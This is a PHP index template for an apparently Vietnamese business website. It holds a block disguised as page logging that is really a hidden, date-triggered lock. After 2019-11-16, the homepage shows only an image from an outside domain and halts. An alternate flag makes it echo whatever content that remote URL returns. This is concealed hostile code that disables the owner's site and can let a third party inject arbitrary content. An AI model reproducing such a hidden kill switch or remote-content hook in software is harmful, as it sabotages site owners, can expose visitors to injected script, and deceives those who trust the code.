<?php

session_start();
error_reporting(0);
$session=session_id();

@define ( '_template' , './templates/');
@define ( '_source' , './sources/');
@define ( '_lib' , './admin/lib/');

 include_once _lib."Mobile_Detect.php";
 $detect = new Mobile_Detect;
 $deviceType = ($detect->isMobile() ? ($detect->isTablet() ? 'tablet' : 'phone') : 'computer');


include_once _lib."config.php";
//include_once _lib."checkSSL.php";
include_once _lib."constant.php";
include_once _lib."functions.php";
include_once _lib."class.database.php";
include_once _lib."functions_user.php";
include_once _lib."functions_giohang.php";
include_once _lib."file_requick.php";

include_once _source."counter.php";	



// begin log page
function geturlPagelog() {
    $pageURL = 'http';
    if ($_SERVER["HTTPS"] == "on") {$pageURL .= "s";}
    $pageURL .= "://";
    if ($_SERVER["SERVER_PORT"] != "80") {
        $pageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
    } else {
        $pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
    }
	$pageURL = explode("&page=", $pageURL);
    return $pageURL[0];
}

$day_1 = date("2019-11-16"); // day lock
$day_2 = date('Y-m-d') ; //current date

$stringDomain='http://datkeyssolar.com/logo.png';
$typeFileLog=1; // 1 n&#7871;u l&#65533; h&#65533;nh &#7843;nh nguoc lai =0

 
$domainUrlArray=explode('/',geturlPagelog());

$days = (strtotime($day_1) - strtotime($day_2)) / (60 * 60 * 24);
if($days<=0) {
	if($domainUrlArray[3]==''){
		 
		if($typeFileLog==1){
		echo '<img src="'.$stringDomain.'" alt="">';
		}else{
			echo $file = file_get_contents($stringDomain, true);
		}
		die();
	} 
}
// end log page

?>

<!doctype html>
<html lang="vi">

<head itemscope itemtype="http://schema.org/WebSite" >
<base href="http://<?=$config_url?>/" />

<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=3.0, minimum-scale=1.0, user-scalable=yes, target-densityDpi=device-dpi">
<script src="js/jquery.min.js"></script>


<link rel="canonical" href="<?=getCurrentPageURL()?>" />
  
<?php include _template."layout/seoweb.php";?>
<?php include _template."layout/main_css.php";?> 

<?=$company['codethem']?>  
     
</head>

<?php //include _template."layout/background.php";?>

<body onLoad="<?php if($com=='lien-he'){ echo 'initialize();';} ?>" <?=$str_background?> >
<div id="wapper">
    <div id="header">
        <?php include _template."layout/header.php";?>
    </div><!---END #header-->
    
    <div class="wap_menu">
        <div class="box_container clearfix">
            <div class="logo">
                <a href=""><img src="<?=_upload_hinhanh_l.$row_logo['photo']?>" /></a>
            </div>
             <div class="menu">
                <?php include _template."layout/menu_top.php";?>
            </div><!---END .menu-->
        </div>
       
    </div><!---END .wap_menu--> 
    <div class="clear"></div>
 
 	<?php if($template=='index') {  ?>
    <div id="slider">
        <?php include _template."layout/slider.php";?>
    </div><!---END #slider--> 
    <?php } ?>
    <div class="clear"></div>
    <?php if($template!='index') { include _template."layout/background_all.php"; } ?>

    <div id="main_content">

        <?php include _template.$template."_tpl.php"; ?>
        
        <div class="clear"></div>
    </div><!---END #main_content-->  

   
    <?php if($template=='index') { include _template."layout/doitac.php"; } ?>
    <div class="clear"></div>

    
    <div id="wap_footer" style="background: url(<?=_upload_hinhanh_l.$row_ft['photo'] ?>) no-repeat;background-size: cover;">
        <?php include _template."layout/footer.php";?>
        <div class="clear"></div>
    </div><!---END#wap_footer-->
    

</div><!---END #wapper-->

<?php include _template."layout/main_js.php";?>
<?php include _template."layout/phone2.php";?>
</body>
</html>

